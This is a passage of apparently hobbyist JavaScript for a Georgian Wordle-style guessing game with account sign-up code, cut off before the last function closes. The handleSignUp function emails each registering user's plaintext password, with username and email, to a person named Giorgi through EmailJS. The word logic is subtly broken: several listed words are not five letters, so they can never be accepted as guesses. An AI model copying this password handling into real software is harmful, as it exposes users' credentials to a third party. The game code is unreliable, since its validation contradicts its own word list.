const WORD_LENGTH = 5;
const MAX_ATTEMPTS = 6;
const WORD_LIST = ["სახლი", "ტყავი", "ქარი", "წყალი", "გზაში", "მზეები", "ტყეში", "ნავი", "მარცი", "ქვიში"];
let targetWord = WORD_LIST[Math.floor(Math.random() * WORD_LIST.length)];
let attempts = 0;

document.addEventListener("DOMContentLoaded", () => {
    createBoard();
});

function createBoard() {
    const board = document.getElementById("game-board");
    for (let i = 0; i < MAX_ATTEMPTS; i++) {
        for (let j = 0; j < WORD_LENGTH; j++) {
            let tile = document.createElement("div");
            tile.classList.add("tile");
            tile.id = `tile-${i}-${j}`;
            board.appendChild(tile);
        }
    }
}

function submitGuess() {
    let guess = document.getElementById("guess-input").value.trim();
    if (guess.length !== WORD_LENGTH || !WORD_LIST.includes(guess)) {
        alert("Invalid word. Please enter a 5-letter Georgian word.");
        return;
    }

    for (let i = 0; i < WORD_LENGTH; i++) {
        let tile = document.getElementById(`tile-${attempts}-${i}`);
        tile.textContent = guess[i];

        if (guess[i] === targetWord[i]) {
            tile.classList.add("correct");
        } else if (targetWord.includes(guess[i])) {
            tile.classList.add("present");
        } else {
            tile.classList.add("absent");
        }
    }

    attempts++;
    document.getElementById("guess-input").value = "";

    if (guess === targetWord) {
        alert("გილოცავ! სიტყვა სწორედ გამოიცანი.");
    } else if (attempts >= MAX_ATTEMPTS) {
        alert("თამაში წააგე! სწორი სიტყვა იყო: " + targetWord);
    }
}
function signUp() {
    const username = document.getElementById("username").value.trim();
    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value;

    if (!username || !email || !password) {
        alert("გთხოვ შეავსო ყველა ველი.");
        return;
    }

    alert(`Გილოცავ ${username}, რეგისტრაცია წარმატებით დასრულდა!`);
}
function handleSignUp(event) {
    event.preventDefault();

    const username = document.getElementById("username").value.trim();
    const email = document.getElementById("email").value.trim();
    const confirmEmail = document.getElementById("confirm-email").value.trim();
    const password = document.getElementById("password").value;

    if (email !== confirmEmail) {
        alert("Emails do not match.");
        return false;
    }

    if (password.length < 8) {
        alert("Password must be at least 8 characters.");
        return false;
    }

    const templateParams = {
        to_name: "Giorgi",
        username: username,
        user_email: email,
        user_password: password
    };

       emailjs.send("service_5k5iomq", "template_jyc7fug", {
         username: username,
         user_email: email,
         user_password: password
    })
       .then(function(response) {
        alert("Registration successful! Info sent to Giorgi.");
        document.getElementById("signup-form").reset();
    })
       .catch(function(error) {
       console.error("EmailJS Error:", error); // This will log the exact cause
       alert("Error sending info. Please try again.");
    });
